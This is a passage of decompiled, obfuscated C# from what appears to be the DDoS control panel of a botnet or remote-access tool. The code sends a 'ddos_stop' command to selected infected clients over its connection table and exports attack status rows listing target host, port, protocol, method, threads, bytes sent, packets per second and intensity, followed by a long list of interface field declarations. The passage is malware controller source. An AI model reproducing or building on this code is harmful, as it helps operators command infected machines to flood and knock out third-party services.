				(enumerator2 as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x06000DF9 RID: 3577 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_26(object sender, EventArgs e)
	{
	}

	// Token: 0x06000DFA RID: 3578 RVA: 0x0006C9BC File Offset: 0x0006ABBC
	private void method_27(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_38();
		if (fastObjectListView.SelectedObjects != null)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string key = ((cDOScli)obj).Key;
					string string_ = "ddos_stop|1";
					string string_2 = key;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06000DFB RID: 3579 RVA: 0x0006CAA0 File Offset: 0x0006ACA0
	private void method_28(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_38();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cDOScli cDOScli = (cDOScli)obj;
					stringBuilder.Append(string.Concat(new string[]
					{
						cDOScli.USER,
						"\t",
						cDOScli.TARGET_HOST,
						"\t",
						cDOScli.TARGET_PORT,
						"\t",
						cDOScli.PROTOCOL,
						"\t",
						cDOScli.METHOD,
						"\t",
						cDOScli.THREADS,
						"\t",
						cDOScli.BYTES_SENT,
						"\t",
						cDOScli.SPEED,
						"\t",
						cDOScli.PPS,
						"\t",
						cDOScli.PACKET_SIZE,
						"\t",
						cDOScli.INTENSITY,
						"\t",
						cDOScli.STATUS,
						"\t",
						cDOScli.DURATION,
						"\r\n"
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000DFC RID: 3580 RVA: 0x0006CC54 File Offset: 0x0006AE54
	private void method_29(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_38();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.Objects)
				{
					cDOScli cDOScli = (cDOScli)obj;
					stringBuilder.Append(string.Concat(new string[]
					{
						cDOScli.USER,
						"\t",
						cDOScli.TARGET_HOST,
						"\t",
						cDOScli.TARGET_PORT,
						"\t",
						cDOScli.PROTOCOL,
						"\t",
						cDOScli.METHOD,
						"\t",
						cDOScli.THREADS,
						"\t",
						cDOScli.BYTES_SENT,
						"\t",
						cDOScli.SPEED,
						"\t",
						cDOScli.PPS,
						"\t",
						cDOScli.PACKET_SIZE,
						"\t",
						cDOScli.INTENSITY,
						"\t",
						cDOScli.STATUS,
						"\t",
						cDOScli.DURATION,
						"\r\n"
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x04000563 RID: 1379
	private VisualButton visualButton_0;

	// Token: 0x04000564 RID: 1380
	private VisualButton visualButton_1;

	// Token: 0x04000565 RID: 1381
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x04000566 RID: 1382
	private ComboBox comboBox_0;

	// Token: 0x04000567 RID: 1383
	private Label label_0;

	// Token: 0x04000568 RID: 1384
	private ComboBox comboBox_1;

	// Token: 0x04000569 RID: 1385
	private Label label_1;

	// Token: 0x0400056A RID: 1386
	private TextBox textBox_0;

	// Token: 0x0400056B RID: 1387
	private Label label_2;

	// Token: 0x0400056C RID: 1388
	private TextBox textBox_1;

	// Token: 0x0400056D RID: 1389
	private Label label_3;

	// Token: 0x0400056E RID: 1390
	private RadioButton radioButton_0;

	// Token: 0x0400056F RID: 1391
	private RadioButton radioButton_1;

	// Token: 0x04000570 RID: 1392
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x04000571 RID: 1393
	private StatusStrip statusStrip_0;

	// Token: 0x04000572 RID: 1394
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x04000573 RID: 1395
	private ToolStripStatusLabel toolStripStatusLabel_1;

	// Token: 0x04000574 RID: 1396
	private ToolStripStatusLabel toolStripStatusLabel_2;

	// Token: 0x04000575 RID: 1397
	private ToolStripStatusLabel toolStripStatusLabel_3;

	// Token: 0x04000576 RID: 1398
	private FastObjectListView fastObjectListView_0;

	// Token: 0x04000577 RID: 1399
	private OLVColumn olvcolumn_0;

	// Token: 0x04000578 RID: 1400
	private OLVColumn olvcolumn_1;

	// Token: 0x04000579 RID: 1401
	private OLVColumn olvcolumn_2;

	// Token: 0x0400057A RID: 1402
	private OLVColumn olvcolumn_3;

	// Token: 0x0400057B RID: 1403
	private OLVColumn olvcolumn_4;

	// Token: 0x0400057C RID: 1404
	private OLVColumn olvcolumn_5;

	// Token: 0x0400057D RID: 1405
	private OLVColumn olvcolumn_6;

	// Token: 0x0400057E RID: 1406
	private OLVColumn olvcolumn_7;

	// Token: 0x0400057F RID: 1407
	private OLVColumn olvcolumn_8;

	// Token: 0x04000580 RID: 1408
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x04000581 RID: 1409
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x04000582 RID: 1410
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x04000583 RID: 1411
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x04000584 RID: 1412
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x04000585 RID: 1413
	private ToolStripMenuItem toolStripMenuItem_3;

	// Token: 0x04000586 RID: 1414
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x04000587 RID: 1415
	private ToolStripMenuItem toolStripMenuItem_4;

	// Token: 0x04000588 RID: 1416
	private OLVColumn olvcolumn_9;

	// Token: 0x04000589 RID: 1417
	private ComboBox comboBox_2;

	// Token: 0x0400058A RID: 1418
	private Label label_4;

	// Token: 0x0400058B RID: 1419
	private Label label_5;

	// Token: 0x0400058C RID: 1420
	private TextBox textBox_2;

	// Token: 0x0400058D RID: 1421
	private PictureBox pictureBox_0;

	// Token: 0x0400058E RID: 1422
	private ComboBox comboBox_3;

	// Token: 0x0400058F RID: 1423
	private Label label_6;

	// Token: 0x04000590 RID: 1424
	private PictureBox pictureBox_1;

	// Token: 0x04000591 RID: 1425
	private Label label_7;

	// Token: 0x04000592 RID: 1426
	private TextBox textBox_3;

	// Token: 0x04000593 RID: 1427
	private Label label_8;

	// Token: 0x04000594 RID: 1428
	private PictureBox pictureBox_2;

	// Token: 0x04000595 RID: 1429
	private OLVColumn olvcolumn_10;

	// Token: 0x04000596 RID: 1430
	private OLVColumn olvcolumn_11;

	// Token: 0x04000597 RID: 1431
	private OLVColumn olvcolumn_12;

	// Token: 0x04000598 RID: 1432
	private ToolStripStatusLabel toolStripStatusLabel_4;

	// Token: 0x04000599 RID: 1433
	public ConcurrentStack<cDOScli> concurrentStack_0;

	// Token: 0x0400059A RID: 1434
	public ConcurrentStack<cDOScli> concurrentStack_1;

	// Token: 0x0400059B RID: 1435
	public ConcurrentStack<cDOScli> concurrentStack_2;

	// Token: 0x0400059C RID: 1436
	private double double_0;

	// Token: 0x0400059D RID: 1437
	private double double_1;

	// Token: 0x0400059E RID: 1438
	private double double_2;

	// Token: 0x02000101 RID: 257
	// (Invoke) Token: 0x06000E00 RID: 3584
	private delegate void Delegate65();

	// Token: 0x02000102 RID: 258
	// (Invoke) Token: 0x06000E04 RID: 3588
	private delegate void Delegate66();

	// Token: 0x02000103 RID: 259
	// (Invoke) Token: 0x06000E08 RID: 3592
	private delegate void Delegate67();

	// Token: 0x02000104 RID: 260
	// (Invoke) Token: 0x06000E0C RID: 3596
	private delegate void Delegate68(string string_0);

	// Token: 0x02000105 RID: 261
	// (Invoke) Token: 0x06000E10 RID: 3600
	private delegate void Delegate69(string string_0, string string_1);

	// Token: 0x02000106 RID: 262
	// (Invoke) Token: 0x06000E14 RID: 3604
	private delegate void Delegate70(string string_0, string[] string_1);
}
